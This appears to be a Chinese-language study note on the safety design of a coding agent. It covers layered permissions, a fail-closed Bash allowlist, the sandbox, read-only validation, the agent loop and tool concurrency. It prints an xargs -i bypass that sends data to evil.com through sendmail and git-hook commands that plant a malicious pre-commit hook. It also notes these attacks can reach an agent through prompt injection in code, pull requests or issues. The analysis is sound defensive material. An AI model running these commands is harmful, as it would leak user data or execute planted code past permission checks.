苏格拉底专题 01：安全体系与 Agent 循环

第一部分：权限系统——五层防御模型

核心设计问题：谁来决定一个工具调用是否安全？

模型既是工具的调用者，也是任务的执行者。让模型自己判断操作安不安全不可靠（幻觉问题），因此安全判断必须由系统规则 + 用户确认共同完成。

五层防御总览

层 机制 思路
1工具静态分类只读工具直接放行
2Bash AST 分析解析命令结构，fail-closed 白名单
3权限规则匹配exact / prefix / wildcard 三级粒度
4用户交互确认以上都无法判断时才问用户
5OS 沙箱最后一道兜底（opt-in）

第二层：Bash AST 分析

核心文件：src/utils/bash/ast.ts

把 bash 命令解析成 AST，在语法树层面判断危险性。关键设计——fail-closed（失败即关闭）：

  • 白名单里的节点 → 逐个分析，放行已知安全的
  • DANGEROUS_TYPES 里的 → 直接标记危险
  • 两者都不在的未知节点 → 也当作危险处理
const DANGEROUS_TYPES = new Set([
  'command_substitution', 'process_substitution',
  'subshell', 'for_statement', 'while_statement',
  'if_statement', 'case_statement', 'function_definition',
  'test_command', 'ansi_c_string', ...
])

为什么比黑名单好？ 黑名单漏掉一个危险命令就完了；白名单漏掉的东西默认被拦截。

第三层：权限规则三级粒度

核心文件：src/utils/permissions/shellRuleMatching.ts

type ShellPermissionRule =
  | { type: 'exact',    command: string }   // "npm test"
  | { type: 'prefix',   prefix: string }    // "npm:*"
  | { type: 'wildcard', pattern: string }   // "git commit -m *"

前缀匹配是「最小授权」和「实用性」之间的平衡点。

第五层：OS 沙箱

核心文件：src/utils/sandbox/sandbox-adapter.ts

平台 机制
macOSseatbelt（sandbox-exec）
Linuxseccomp + bubblewrap

关键发现：沙箱默认关闭（settings?.sandbox?.enabled ?? false）。原因是可用性——沙箱会导致 npm install 等常见操作直接失败。

配置后 autoAllowBashIfSandboxed 可自动放行 bash——沙箱接管安全职责后，权限确认就可以放松。

第二部分：只读判断深潜

flag 级白名单

核心文件：src/tools/BashTool/readOnlyValidation.ts

const COMMAND_ALLOWLIST = {
  xargs: {
    safeFlags: {
      '-I': '{}',
      '-n': 'number',
      '-0': 'none',
      // -i 和 -e 被移除！
    }
  },
  sed: { safeFlags: { '--quiet': 'none', ... } },
  ...GIT_READ_ONLY_COMMANDS,
}

xargs -i 漏洞案例

echo /usr/sbin/sendm | xargs -it tail a@evil.com
# 验证器以为：-i 和 t 是两个 flag
# GNU xargs 实际：-i 的 replace-str=t，tail 成为目标命令
# → /usr/sbin/sendmail → 网络数据泄露

git hooks 攻击向量

git status 是只读命令，但 git 执行前会跑 hooks——hooks 可执行任意代码。

三种攻击场景：

  1. cd /malicious/dir && git status — 触发恶意 hooks
  2. 裸仓库伪造 — 删 .git/HEAD，当前目录放 hooks/pre-commit
  3. 先写后执行 — mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status

攻击者不需要是内鬼——通过 prompt injection，在代码、PR、issue 中嵌入指令即可。

完整只读判断链

命令能解析吗？
  → 有未展开的变量/通配符吗？
    → 命令名在白名单里吗？
      → 每个 flag 都在 safeFlags 里吗？
        → flag 的参数类型匹配吗？
          → 全部通过 → readOnly = true
任何一步失败 → false（fail-closed）

第三部分：Agent 循环——状态机

基本结构

核心文件：src/query.ts

query() 是 AsyncGenerator（async function*），用 while(true) 驱动。AsyncGenerator 让每个事件实时 yield 给调用方，实现流式渲染。

状态定义

type State = {
  messages: Message[]
  turnCount: number
  transition: Continue | undefined
  hasAttemptedReactiveCompact: boolean
  maxOutputTokensRecoveryCount: number
  // ...
}

退出原因三类

类别 reason 说明
正常结束completed模型说完了
aborted_streaming用户中断（streaming）
aborted_tools用户中断（工具执行）
hook_stoppedHook 阻止
异常退出prompt_too_long上下文超长
model_errorAPI 报错
blocking_limit速率限制
自救转换reactive_compact_retry压缩后重试
max_output_tokens_escalate调高 token 上限
next_turn正常下一轮

自救用 transition（不退出循环），异常用 return（退出循环）。

第四部分：工具并发控制

isConcurrencySafe

核心文件：src/services/tools/StreamingToolExecutor.ts

canExecuteTool(isConcurrencySafe: boolean): boolean {
  const executingTools = this.tools.filter(t => t.status === 'executing')
  return (
    executingTools.length === 0 ||
    (isConcurrencySafe && executingTools.every(t => t.isConcurrencySafe))
  )
}

BashTool 的动态判断

isConcurrencySafe(input) {
  return this.isReadOnly?.(input) ?? false;
}

bash("ls") → 只读 → 可并发；bash("npm install") → 非只读 → 独占。

工具自声明比全局「读/写」分类更精确——两个写不同文件的操作可以安全并行，两个 npm install 却会冲突。

关键设计原则

原则 体现
Fail-closedAST 白名单、只读判断链
分层防御五层各有不同安全/体验平衡点
安全 vs 体验沙箱 opt-in、autoAllowBashIfSandboxed
自声明优于全局规则isConcurrencySafe 由工具自己决定
状态机驱动Agent 循环的 transition
流式优先AsyncGenerator 实时输出
